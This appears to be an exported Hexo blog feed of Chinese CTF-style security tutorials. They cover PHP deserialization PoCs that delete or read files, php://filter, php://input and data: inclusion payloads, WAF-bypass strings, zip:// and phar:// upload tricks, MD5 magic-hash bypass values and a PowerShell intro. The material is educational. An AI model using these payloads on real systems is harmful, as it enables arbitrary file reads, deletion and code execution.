1962090331357fc9ce4242979acfb1e2a9d0fdef1526369e1d055165b61aa9d2370fe81a7da3981a05cc9281398ce3433bdfb85114f1830a06f5c721e77007c80ec1c89ba36e07ad79289dee286978d088195f15f8c3cb0626d6c3ea9bfec8d76fd3a086d58c10cd2630c77e03e49f513c697ead2456d00955ecca2b0ad3f55590fcd33d080b417c1b65159fee978fabc54b6eb178f2a663011423964c4593a8c6bd96f8ed0c8d1e0b9d3b59293cb7df993d1797faf610fb8525fd7b4bdff95d9aac5c0057486d4635d542b663611a18145829d29e3acdaea51a1aa8bf075099a987c77e52f24cd902f050a8a5a7b5bea2f83f86dc283ff96b29962e79d888fad1b8adb6172b67862236fa0bc2526b9a3ce1d8bf98361249de5e50a600436aa7ac82e545c763500359f4f9a8fc4de6e39220c42f8c82ccd0785c55e99d3b4666632e51454663d7bd4e30d63e26a9a6923533774389a7d454d3f4a9c1ee3c8ee32bf12a78855d717eb37e88031bfe4d149740e207a6d450a3e431627b5140591eec37090c714d52e57e9716107ac734211d2acaa81d67bfb5f9d1293f4076f1ec0f366a77f337fc917cef47eabe809afe309b93237948ff60edd0fbe3e253e51d00207d00c90e6f0a08b18e1430344e1ab59678fdbd1ff374d0831b4d1f6b7f9e3275d6c76ae44b8bd3a25983dec374d877b360f7d5fb9fade8d387e8adb3a4fe9e8fe5b8da0b89dd5c48678fac77239220114b8837246be759de0468ca7e37145665b64dd796c0b76f427923153ccedfd68ccb0b42818b7668ae0e9238777133b4bc379325c7c906a6ba8847d9942fc2c0eea60b83dce9c0f59d59374200baefbff5e80c21d725c3018ea64c6254cd5c96eb69520508f71afe681217f42fdee58840d763329f9b925ad56bd8ab400b97247b4de6a026ebd2f6a34f548633d79c2a08e336435c3360d049ddc7abc757140f4f5ee6b9dc6f3c42a31dfe9bae19d66d0be00fe359cdad201a134849503e975438fc6daa4b533cf85c96def146ef37af5e9d7012a6978183719f9f44772fe273232ce78d1b4d59488f851ff1b9657862c80b1e183e68af57e380cf8217622f5e03b3e90b8654ac7eab72fe9844132bdac52ffd29481788702c2591e835b9a63f2ddbd132cc3b641e152a6e67d3b1caca184b232883c77596b04b92cf212eb650d76c4cf923685ee9fde5d62666257cb54a34975a95023047f8b3f4cc15970001d5de419879d0da8cdcfc5132274887abcf61bae1194cc19efa6b8f17cdaf0e1eb860ba4b98d0a67763b56d313260212986447557be595d86a45d47f3c60df9f6cb888401f5a016f697353061a5c7bc29ee534cc628a5d6b40e049bbcedc3a7e12131584129e0cf9a273b0c7892a9dedada03990faffcddbc292ea1db8258c556b79cfbf2c2b2d703bf82796ec1b8be7ed7484dda54938b8afd648f65142b711d1b68a77e787acc1d735d6986efc13ed7a4fcf7836f723b2235225aa1e27918f31e1cc1ecc224d341f77edc4d114376c5a2b41f87d01e54b0b2514578402ba7ed2625472884e2e5816b5c76a572aa81b81c748bcd5c7138f8b50e1ac8b4852907b56181a0d4f38df38a033d11cec44b88b290caefd1c92cb92cae529e04f5c576d7cb1c406a411fd574d8f0ecb443f048ca2c15c85bc60cc750b3db46cb1c1077b6433ef49f101bca7075ca34271acda14ef5b8120d60f5ff2020680c19ecbf86a8eaa2260cf939a3dfc278f337d2a9d0aa0a7d8c1c3a7401a279154a1dfa20411e8570466cc6f5f660add3d8b95581905141574abf892550b477d83e55686bff510d3b5e0fd985e06cfa2329ce6ad8e986db6897a56746b97343fc8d870c6cedf14539e0a7fb0a67de8029efe8bce0b141bd93d33b88f69fa1463664975a6d5654369f2b6e593216c03e3fc5b91996491b153811dcd9cea4d1524e9749ac8174a9abc08aad423809e070b0e1fe2756e2257e2e52d51c5ea79ff35df2944badca982eaf8804ad642c86796c8ff7a9db6d068bf601f965848c6b5a93871b6a65d628cdb7c5def6635093eda53f2b0a4c0fd096097eb6dd535bd2fac75ac2b4aaf9039dfc60853f46c4af8569e9fd3f7e34ea3462922d1a0ef6b5a02765eb569199f43b93ca76ffb9a77cd725d0d2e042215f260f4c46a3c4450fa8cacc1d8d5436c7a7274eedaa8c6fdb8aac61668df47073355abf4c52fb8f1a4b4e2f0c0622f8ed50e49af592db131b38875178b7f48e369057d80361ef7f8b37915bd89a8506adc78476abc66908bf434ddc2ee6222d5866442c76f1e26c362715ff3d88bba3eee3434cce5c63fac28681cdae2125635f1dae60b54ce7cbeaef6753fcf5284bda04cd3312c57f454cb0213ec09cbf3f3d71ef012077df60266593fe6b3efc74eaf3f429676b23754e6417d045b313c035237f93bcc0044aca49d1fef1643de5b388b2f7adabf5eea51ac260bbb5af9882304cadaf33d42799614458000b05d26b12e28722b15a3dbdc232713dcf5f3b978f825a43a47246f475457d0c5a037efb2d045988f15f06f90ec528f03aa0bd1111efe3cda116454fc53c72a822a6f32eef93506b0580bc88f4f418b97c23d8e6f07b179c420d8bc582b8dbe46e9e446177e1d1ddcb430fa6f41e92a5a7d42ac7d</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>php序列化与反序列化</title>
    <url>/posts/52358.html</url>
    <content><![CDATA[<p><img src="http://pp64r48ul.bkt.clouddn.com/3.jpeg" alt></p>
<a id="more"></a>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在总结php序列化相关的知识，看了好多网上的文章，现在将自己的理解记录下来。</p>
<h2 id="php序列化与反序列化基础"><a href="#php序列化与反序列化基础" class="headerlink" title="php序列化与反序列化基础"></a>php序列化与反序列化基础</h2><h3 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h3><ul>
<li>序列化是将变量转换为可保存或可传输的字符串的过程。</li>
<li>反序列化就是在适当的时候把这个字符串再转化成原来的变量使用。</li>
</ul>
<h3 id="php序列化与反序列化函数"><a href="#php序列化与反序列化函数" class="headerlink" title="php序列化与反序列化函数"></a>php序列化与反序列化函数</h3><ul>
<li>serialize():可以将变量转换为字符串并且在转换中可以保存当前变量的值。</li>
<li>unserialize():可以将serialize()生成的字符串转化为变量。</li>
<li>php进行序列化的目的就是保存一个对象方便以后重用。</li>
</ul>
<h3 id="php序列化实例"><a href="#php序列化实例" class="headerlink" title="php序列化实例"></a>php序列化实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">	&#x2F;&#x2F; 变量</span><br><span class="line">	public $name &#x3D; &#39;&#39;;</span><br><span class="line">	public $age &#x3D; 0;</span><br><span class="line"></span><br><span class="line">	public function Information()</span><br><span class="line">	&#123;</span><br><span class="line">		echo &#39;Person:&#39;.$this-&gt;name.&#39;is&#39;.$this-&gt;age.&#39;years old.&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$per &#x3D; new Person();</span><br><span class="line">$per -&gt; name &#x3D; &#39;Lv&#39;;</span><br><span class="line">$per -&gt; age &#x3D; 18;</span><br><span class="line"></span><br><span class="line">echo serialize($per); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>运行结果：<br><code>O:6:&quot;Person&quot;:2:{s:4:&quot;name&quot;;s:2:&quot;Lv&quot;;s:3:&quot;age&quot;;i:18;}</code><br>这里的<code>O</code>代表存储的是对象（object）,假如你给<code>serialize()</code>传入的是一个数组，那它会变成字母<code>a</code>。<code>7</code>表示对象的名称有7个字符。<code>&quot;chybeta&quot;</code>表示对象的名称。<code>1</code>表示有一个值。<code>{s:4:&quot;test&quot;;s:3:&quot;123&quot;;}</code>中，<code>s</code>表示字符串，<code>4</code>表示该字符串的长度，<code>&quot;test&quot;</code>为字符串的名称，之后的类似。</p>
<ul>
<li>serialize():序列化一个对象将会保存对象的所有变量，但不会保存对象的方法，只会保存类的名字。</li>
</ul>
<h3 id="php反序列化实例"><a href="#php反序列化实例" class="headerlink" title="php反序列化实例"></a>php反序列化实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">	&#x2F;&#x2F; 变量</span><br><span class="line">	public $name &#x3D; &#39;&#39;;</span><br><span class="line">	public $age &#x3D; 0;</span><br><span class="line">	&#x2F;&#x2F; 方法</span><br><span class="line">	public function Information()</span><br><span class="line">	&#123;</span><br><span class="line">		echo &#39;Person:&#39;.$this-&gt;name.&#39; is &#39;.$this-&gt;age.&#39; years old.&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 反序列化实例</span><br><span class="line">$per &#x3D; unserialize(&#39;O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:2:&quot;Lv&quot;;s:3:&quot;age&quot;;i:18;&#125;&#39;);</span><br><span class="line"></span><br><span class="line">print_r($per);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Person Object</span><br><span class="line">(</span><br><span class="line">    [name] &#x3D;&gt; Lv</span><br><span class="line">    [age] &#x3D;&gt; 18</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<ul>
<li>unserialize():unserialize()一个对象，这个对象的类必须已经定义过。</li>
</ul>
<h3 id="php魔法函数"><a href="#php魔法函数" class="headerlink" title="php魔法函数"></a>php魔法函数</h3><p>php类中包含了一些魔法函数，这些函数可以在脚本的任何地方不用声明就可以使用。</p>
<ul>
<li>__construct()    // 当一个对象创建时被调用</li>
<li>__destruct()     // 对象被销毁时触发</li>
<li>__wakeup()       // 使用unserialize时触发</li>
<li>__sleep()        // 使用serialize时触发</li>
<li>__toString()     // 把类当作字符串使用时触发</li>
<li>__get()          // 用于从不可访问的属性读取数据</li>
</ul>
<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>由前面可以看出，当传给 unserialize() 的参数可控时，我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。</p>
<p>下面是我在本地搭建的环境。</p>
<h3 id="php反序列化漏洞demo1"><a href="#php反序列化漏洞demo1" class="headerlink" title="php反序列化漏洞demo1"></a>php反序列化漏洞demo1</h3><ul>
<li>test1.php:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class delete</span><br><span class="line">&#123;</span><br><span class="line">	public $filename &#x3D; &#39;error&#39;;</span><br><span class="line">	function __destruct()</span><br><span class="line">	&#123;</span><br><span class="line">		echo $this-&gt;filename.&#39; was deleted!&#39;;</span><br><span class="line">		unlink(dirname(__FILE__).&#39;&#x2F;&#39;.$this-&gt;filename);</span><br><span class="line">	&#125;   &#x2F;&#x2F; unlink()函数执行删除文件操作</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>test1.php</code>中可以看到，delete类中定义了一个<code>__destruct()</code>函数，该函数中会执行删除文件的操作。如果我们想利用该类来执行任意文件的删除操作，则需要寻找到一个可控的<code>unserialize()</code>函数</p>
<ul>
<li>test2.php:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#39;test1.php&#39;;</span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">	public $name &#x3D; &#39;&#39;;</span><br><span class="line">	public $age &#x3D; 18;</span><br><span class="line">	public function Information()</span><br><span class="line">	&#123;</span><br><span class="line">		echo &#39;Person:&#39;.$this-&gt;name.&#39; is &#39;.$this-&gt;age.&#39;years old&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$per &#x3D; unserialize($_GET[&#39;per_serialized&#39;]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>在<code>test2.php</code>中包含了<code>test1.php</code>,并且我们可以看到<code>$per = unserialize($_GET[&#39;per_serialized&#39;]);</code>,其中<code>per_serialized</code>是可控的。</p>
<p>如果我们已经知道在该目录下有一个<code>1.txt</code>文件，如果我们想要删除这个文件，则可以这样构造poc：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class delete</span><br><span class="line">&#123;</span><br><span class="line">	public $filename &#x3D; &#39;error&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test &#x3D; new delete();</span><br><span class="line">$test-&gt;filename &#x3D; &#39;1.txt&#39;;    &#x2F;&#x2F;filename的值就是我们想要删除的文件名</span><br><span class="line"></span><br><span class="line">echo serialize($test);   &#x2F;&#x2F;序列化输出</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>可以得到payload为：<code>O:6:&quot;delete&quot;:1:{s:8:&quot;filename&quot;;s:5:&quot;1.txt&quot;;}</code>。</p>
<p>访问：<a href="http://127.0.0.1/test2.php?per_serialized=O:6:%22delete%22:1:{s:8:%22filename%22;s:5:%221.txt%22;}" target="_blank" rel="noopener">http://127.0.0.1/test2.php?per_serialized=O:6:%22delete%22:1:{s:8:%22filename%22;s:5:%221.txt%22;}</a></p>
<p><img src="http://pp64r48ul.bkt.clouddn.com/1.png" alt="在这里插入图片描述"></p>
<p>访问：<a href="http://127.0.0.1/1.txt" target="_blank" rel="noopener">http://127.0.0.1/1.txt</a></p>
<p><img src="http://pp64r48ul.bkt.clouddn.com/2.png" alt="在这里插入图片描述"></p>
<h3 id="php反序列化漏洞demo2"><a href="#php反序列化漏洞demo2" class="headerlink" title="php反序列化漏洞demo2"></a>php反序列化漏洞demo2</h3><ul>
<li>test4.php:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class read</span><br><span class="line">&#123;</span><br><span class="line">	public $filename &#x3D; &#39;error&#39;;</span><br><span class="line">	function __toString()</span><br><span class="line">	&#123;</span><br><span class="line">		&#x2F;&#x2F;file_get_contents()函数把整个文件一次性读入一个字符串中</span><br><span class="line">		return file_get_contents($this-&gt;filename);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>在<code>test4.php</code>中可以看到，类中定义了一个<code>__toString()</code>函数，该函数可以返回一个文件内容。如果我们想利用该类来读取任意文件，不仅需要寻找一个可利用的<code>unserialize</code>,还要有一个触发<code>toString()</code>函数的条件。</p>
<ul>
<li>test5.php</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#39;test4.php&#39;;</span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">	public $name &#x3D; &#39;&#39;;</span><br><span class="line">public $age &#x3D; 18;</span><br><span class="line">public function Information()</span><br><span class="line">&#123;</span><br><span class="line">	echo &#39;Person:&#39;.$this-&gt;name.&#39; is &#39;.$this-&gt;age.&#39;years old&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$per &#x3D; unserialize($__GET[&#39;per_serialized&#39;]);</span><br><span class="line"></span><br><span class="line">echo $per;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>在<code>test5.php</code>中，包含了<code>test4.php</code>。可以看到<code>$per = unserialize($__GET[&#39;per_serialized&#39;]);</code>，其中<code>per_serialized</code>可控。<code>echo $per;</code>会触发<code>__toString()</code>函数</p>
<p>构造poc，得到payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class read</span><br><span class="line">&#123;</span><br><span class="line">	public $filename &#x3D; &#39;error&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test &#x3D; new read();</span><br><span class="line">$test -&gt; filename &#x3D; &#39;2.txt&#39;;</span><br><span class="line"></span><br><span class="line">echo serialize($test);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>payload:<code>O:4:&quot;read&quot;:1:{s:8:&quot;filename&quot;;s:5:&quot;1.txt&quot;;}</code></p>
<p>访问：<a href="http://127.0.0.1/2.txt" target="_blank" rel="noopener">http://127.0.0.1/2.txt</a></p>
<p><img src="http://pp64r48ul.bkt.clouddn.com/4.png" alt="在这里插入图片描述"></p>
<p>访问：<a href="http://127.0.0.1/test5.php?per_serialized=O:4:%22read%22:1:{s:8:%22filename%22;s:5:%222.txt%22;}" target="_blank" rel="noopener">http://127.0.0.1/test5.php?per_serialized=O:4:%22read%22:1:{s:8:%22filename%22;s:5:%222.txt%22;}</a></p>
<p><img src="http://pp64r48ul.bkt.clouddn.com/5.png" alt="在这里插入图片描述"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过上面的学习，我们知道，要想找到一个php漏洞，需要先找到可控的反序列化函数，通过这些反序列化函数，我们去调用一些类，这些类中可能会包含一些魔法函数，在这些魔法函数中可能会有一些我们可控的危险操作，从而触发了php反序列化漏洞。</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>phpinfo可以告诉我们什么</title>
    <url>/posts/41559.html</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">输入密码，查看文章！</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="f1ec3c70e5c3c5c9ac84d25a9c966cc579d9a692635d1dfe20a34486225544aa">607f0202230253bfae7c7369de0f7e695689ba1fcf854eff38844e46219119e26c02a27b87e6e48b5dbd6709e184ca33069e84be0e262d288b5fd9efda4e0bc538e80641726506ff665d27035eff4f880c972ae1dfea8fc1ae386d7a80fdb0c9f54e971cc2cb6d60766dfb01348c52c77516e6922e642121a3e060123f6101c35507f1184310a9fddadc6a63f5ac621d2168813a995de12d824e0e30bb1189b5aa1ccedeb7798572f656fd613d9534857b61283fd792058feabd22796b527230</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>php伪协议</title>
    <url>/posts/3072.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>PHP伪协议在CTF中经常出现，也经常跟文件包含，文件上传，命令执行等漏洞结合在一起，所以本文章对常见的一些协议进行总结。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F; — 访问本地文件系统</span><br><span class="line">http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</span><br><span class="line">ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</span><br><span class="line">php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams</span><br><span class="line">zlib:&#x2F;&#x2F; — 压缩流</span><br><span class="line">data:&#x2F;&#x2F; — 数据（RFC 2397）</span><br><span class="line">glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</span><br><span class="line">phar:&#x2F;&#x2F; — PHP 归档</span><br><span class="line">ssh2:&#x2F;&#x2F; — Secure Shell 2</span><br><span class="line">rar:&#x2F;&#x2F; — RAR</span><br><span class="line">ogg:&#x2F;&#x2F; — 音频流</span><br><span class="line">expect:&#x2F;&#x2F; — 处理交互式的流</span><br></pre></td></tr></table></figure>

<p><strong>今天着重研究php://</strong></p>
<p>有两个比较重要的配置在<code>php.ini</code>中，<code>allow_url_fopen</code> 和<br><code>allow_url_include</code>会影响到<code>fopen</code>等等和<code>include</code>等等函数对于伪协<br>议的支持，而<code>allow_url_include</code>依赖<code>allow_url_fopen</code>，所以<br><code>allow_url_fopen</code>不开启的话，<code>allow_url_include</code>也是无法使用的。</p>
<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p><code>php://input</code>代表可以访问请求的原始数据，简单来说<code>POST</code>请求的情况下，<code>php://input</code>可以获取到post的数据。</p>
<ul>
<li><strong>使用条件：include()、include_once()、file_get_contents()</strong></li>
</ul>
<p>比较特殊的一点，<code>enctype=”multipart/form-data”</code> 的时候 php://input 是无效的。</p>
<h3 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h3><p>php://output 是一个只写的数据流，允许你以 <code>print</code> 和 <code>echo</code> 一样的方式写入到输出缓冲区。</p>
<h3 id="php-filter-重点"><a href="#php-filter-重点" class="headerlink" title="php://filter(重点)"></a>php://filter(重点)</h3><p>这篇文章的关键在于讨论<code>php://filte</code>r,事实上，这也是我们常常使用的一个伪协议，在任意文件读取，甚至getshell的时候都有利用的机会。</p>
<p><code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用，也就是作为一种过滤器，可以使用在数据流产生的地方。</p>
<p>这对于一体式（all-in-one）的文件函数非常有用，类似 <code>readfile()</code>、 <code>file()</code> 和 <code>file_get_contents()</code>， 在数据流内容读取之前没有机会应用其他过滤器。</p>
<p>事实上，在<code>include</code>函数的使用上，经常会造成任意文件读取漏洞，而<code>file_get_contents()</code>和<code>file_put_contents()</code>这样函数下，常常会构成getshell等更严重的漏洞。</p>
<h2 id="URL中包含点的常见形式"><a href="#URL中包含点的常见形式" class="headerlink" title="URL中包含点的常见形式"></a>URL中包含点的常见形式</h2><ul>
<li><p><code>?file = xxx 或者 ?file = xxx.php</code></p>
<p>那么源码中的写法：</p>
<p><code>include($file.&#39;php&#39;) 或者 include($file)</code></p>
<p>这里直接使用伪协议包含：</p>
<p><code>?file=php://filter/read=convert.base64-encode/resource=login</code></p>
</li>
<li><p><code>?action = xxx &amp; mode = xxx</code></p>
<p>这里形式就是文件夹加上文件名的方法</p>
<p><code>http://www.example.com/index.php?action=front&amp;mode=login</code></p>
<p>那么源码中的写法：</p>
<p><code>include($action.&#39;/&#39;.$mode.&#39;.php&#39;);</code></p>
<p>那么对于这种情况使用的伪协议包含形式：</p>
<p><code>?action=php://filter/read=convert.base64-encode/resource=./&amp;mode=login</code></p>
</li>
</ul>
<h2 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h2><p>题目链接：<a href="http://level3.tasteless.en/" target="_blank" rel="noopener">http://level3.tasteless.en/</a></p>
<p>题目直接给出了源码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#39;index.php&#39;);</span><br><span class="line">&#x2F;*</span><br><span class="line">view file: php.ini</span><br><span class="line">so here is my hint: the included php.ini file is part of the configugartion file used on the server the bug was found.</span><br><span class="line">so there will be something in it which enables you to solve this level, wont?</span><br><span class="line"></span><br><span class="line">always be UP TO DATE!</span><br><span class="line"></span><br><span class="line">hint enough, might just take you seconds to do?!</span><br><span class="line">*&#x2F;</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&#39;anti_rfi.php&#39;); &#x2F;&#x2F;rfi is forbidden!!!!!</span><br><span class="line"></span><br><span class="line">$inc &#x3D; @$_GET[&#39;file&#39;];</span><br><span class="line">@require_once($inc);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>用php://input直接就能执行任意代码<br><img src="/posts/3072/%E4%BC%AA%E5%8D%8F%E8%AE%AE1.jpg" alt></p>
<h3 id="绕过waf的方法"><a href="#绕过waf的方法" class="headerlink" title="绕过waf的方法"></a>绕过waf的方法</h3><p>在一些ctf中会对一些伪协议的关键词进行过滤，如read、resource等等，下面总结了几条绕过方法，在实战总作为字典来跑。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?f&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;login.php（过滤了操作名read）</span><br><span class="line"></span><br><span class="line">?f&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;1.jpg&#x2F;resource&#x3D;.&#x2F;show.php（正则 &#x2F;resource&#x3D;*.jpg&#x2F;i）</span><br><span class="line"></span><br><span class="line">?f&#x3D;data:text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line"></span><br><span class="line">?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure>

<h2 id="截断包含"><a href="#截断包含" class="headerlink" title="截断包含"></a>截断包含</h2><h3 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h3><p>这里技巧现在应该是用的比较少了，因为利用截断要满足下面的两个条件：</p>
<ul>
<li><p>php版本小于5.3.4</p>
</li>
<li><p>magic_quotes_gpc为off</p>
</li>
</ul>
<h3 id="截断-1"><a href="#截断-1" class="headerlink" title="./ 截断"></a>./ 截断</h3><p>点号和路径截断以及./截断，也就是填充大量的./使url长度超过最大值，来达到截断的目的。</p>
<p>具体可以看下面的文章：<a href="https://blog.csdn.net/zvall/article/details/8951925" target="_blank" rel="noopener">https://blog.csdn.net/zvall/article/details/8951925</a> </p>
<h2 id="zip协议和phar协议"><a href="#zip协议和phar协议" class="headerlink" title="zip协议和phar协议"></a>zip协议和phar协议</h2><p>在实战过程中，若发现存在文件上传但是没有办法直接上传php文件，可以传zip压缩文件，我们就利用这两个协议，将php文件打包成zip文件来包含里面的php脚本。</p>
<p>phar://、zip://，都可以看到在phpinfo中有相应的描述。</p>
<p>例如脚本文件为1.php，打包成1.zip，然后再改名为1.jpg，上传之后包含1.jpg中的php文件即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zip:&#x2F;&#x2F;..（当前脚本的绝对路径）...&#x2F;1.jpg#1.php</span><br><span class="line">phar:&#x2F;&#x2F;...（当前脚本的绝对路径）...&#x2F;1.jpg&#x2F;1（分割不加后缀名）</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>php弱类型</title>
    <url>/posts/21181.html</url>
    <content><![CDATA[<p>弱类型</p>
<p>比较：<br>=== 强等于 ：先判断两种字符串的类型，再比较<br>==  弱等于 ：先将字符串类型转换成相同，再比较</p>
<a id="more"></a>
<p>如果一个数值和字符串进行比较的时候，会将字符串转换成数值<br>Abc == 0<br>1abc == 1<br>Abc1 == 0<br>0e123 == 0e456 //0e被识别为科学计数法</p>
<p>如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内<br>该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0</p>
<p>a = 1 + “10.5”  //a = 11.5<br>b = 1 + “-1.1e3” //a = -1099<br>c = 1 + “ab123”   //c = 1<br>d = 1+”2ab”    //d = 3</p>
<p>MD5绕过<br>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0</p>
<p>QNKCDZO<br>0e830400451993494058024219903391</p>
<p>s878926199a<br>0e545993274517709034328855841020</p>
<p>s155964671a<br>0e342768416822451524974117254469</p>
<p>s214587387a<br>0e848240448830537924465865611904</p>
<p>s214587387a<br>0e848240448830537924465865611904</p>
<p>s878926199a<br>0e545993274517709034328855841020</p>
<p>s1091221200a<br>0e940624217856561557816327384675</p>
<p>s1885207154a<br>0e509367213418206700842008763514</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>powershell学习</title>
    <url>/posts/57592.html</url>
    <content><![CDATA[<h2 id="powershell基础"><a href="#powershell基础" class="headerlink" title="powershell基础"></a>powershell基础</h2><p>Windows Powershell是一种命令行外壳程序和脚本环境，内置在每个受支持的Windows版本中，为Windows命令行使用者和脚本编写者利用 .NET Framework 的强大功能提供了便利。只要可以在一台计算机上面执行代码，就可以将Powershell脚本(.ps1)下载到磁盘中执行（甚至无需将脚本文件写入到磁盘中）。</p>
<p>特点：</p>
<ul>
<li>在win7以上版本默认安装</li>
<li>脚本可以在内存中运行，不需要写入磁盘</li>
<li>几乎不会触发杀毒软件</li>
<li>可以远程执行</li>
<li>很多工具是基于powershell开发</li>
<li>cmd的运行通畅会被阻，powershell通常不会</li>
<li>使Windows脚本执行变得更容易</li>
<li>可用于管理活动目录</li>
</ul>
<table>
<thead>
<tr>
<th align="center">操作系统</th>
<th align="center">Powershell版本</th>
<th align="center">是否可升级</th>
</tr>
</thead>
<tbody><tr>
<td align="center">win7、win server 2008</td>
<td align="center">2.0</td>
<td align="center">可升级为3.0/4.0</td>
</tr>
<tr>
<td align="center">win8、win server 2012</td>
<td align="center">3.0</td>
<td align="center">可升级为4.0</td>
</tr>
<tr>
<td align="center">win8.1、win server 2012 R2</td>
<td align="center">4.0</td>
<td align="center">否</td>
</tr>
</tbody></table>
<p>可以输入 <code>Get-Host</code> 或者 <code>$PSVersionTable.PSVERSION</code> 命令查看Powershell的版本</p>
<p><img src="/posts/57592/F:%5Cimages%5Cimage-20200319172210196.png" alt="image-20200319172210196"></p>
